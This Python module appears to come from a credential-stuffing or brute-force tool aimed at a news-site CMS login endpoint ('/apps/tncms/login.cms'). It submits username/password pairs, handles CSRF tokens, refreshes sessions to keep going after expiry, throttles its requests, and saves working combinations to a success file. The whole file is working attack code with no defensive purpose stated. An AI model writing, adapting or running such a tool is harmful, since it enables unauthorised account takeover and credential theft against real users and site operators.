import time
import requests
from typing import Set, Tuple
from utils.files_utils import save_to_file
from utils.session_utils import refresh_session, fetch_login_form, extract_csrf
from settings import (
    LOGIN_PAGE_URL,
    SUCCESS_FILE_PATH,
    USERNAME_PARAM_STRING,
    PASSWORD_PARAM_STRING,
    CSRF_PARAM_STRING,
    DELAY_BETWEEN_REQUESTS,
    MAX_ATTEMPTS_PER_SESSION,
)


def try_login(
    session: requests.Session,
    known_success: Set[str],
    username: str,
    password: str,
    attempt_counter: int = 0,
) -> Tuple[bool, int]:
    """
    Attempt login and refresh session periodically.

    Returns:
        Tuple[bool, int]: (login_successful, updated_attempt_counter)
    """
    session, attempt_counter = refresh_session(session, attempt_counter)
    if session is None:
        return False, attempt_counter

    post_url, form_values = fetch_login_form(session)

    payload = {
        USERNAME_PARAM_STRING: username,
        PASSWORD_PARAM_STRING: password,
        "redirect": form_values.get("redirect", "/apps/tncms/login.cms"),
    }
    csrf_val = extract_csrf(form_values)
    if csrf_val:
        payload[CSRF_PARAM_STRING] = csrf_val

    try:
        resp = session.post(post_url, data=payload, timeout=15)
        session.cookies.update(resp.cookies)
        time.sleep(DELAY_BETWEEN_REQUESTS)

        if resp.status_code in (401, 403):
            print("[*] Session expired, refreshing...")
            session, attempt_counter = refresh_session(
                session, MAX_ATTEMPTS_PER_SESSION
            )
            return False, attempt_counter

        if resp.status_code != 200:
            print(f"[!] Unexpected status {resp.status_code} for {username}:{password}")
            return False, attempt_counter + 1

        try:
            response_json = resp.json()
        except ValueError:
            print(f"[!] Non-JSON response for {username}:{password}")
            return False, attempt_counter + 1

        if not response_json.get("error"):
            combo = f"{username}:{password}"
            if combo not in known_success:
                save_to_file(SUCCESS_FILE_PATH, combo)
                known_success.add(combo)
            print(f"[+] Success: {combo}")
            return True, attempt_counter + 1

    except requests.RequestException as e:
        print(f"[!] Request error for {username}:{password} -> {e}")
    except Exception as e:
        print(f"[!] Unexpected error for {username}:{password} -> {e}")

    return False, attempt_counter + 1
